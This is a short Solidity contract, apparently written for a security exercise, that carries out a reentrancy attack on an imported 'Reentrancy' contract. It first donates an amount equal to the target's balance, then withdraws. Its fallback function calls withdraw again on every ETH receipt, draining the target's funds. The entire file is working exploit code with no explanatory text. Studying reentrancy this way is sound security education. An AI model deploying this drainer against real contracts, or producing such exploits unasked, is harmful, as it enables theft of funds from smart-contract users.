// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrancy.sol";

contract ReentrancyAttack {
    Reentrancy public target;
    uint256 public attackAmount;
    event Withdraw(uint256 amount);

    constructor(address payable _target) {
        target = Reentrancy(_target);
        attackAmount = address(target).balance;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() internal {
        target.withdraw(attackAmount);
        emit Withdraw(attackAmount);
    }

    // We have to send ETH within this function, the exact amount of <attackAmount>, otherwise it will not work.
    function attack() public payable {
        target.donate{value: attackAmount}(address(this));
        withdraw();
    }

    fallback() external payable {
        withdraw();
    }
}
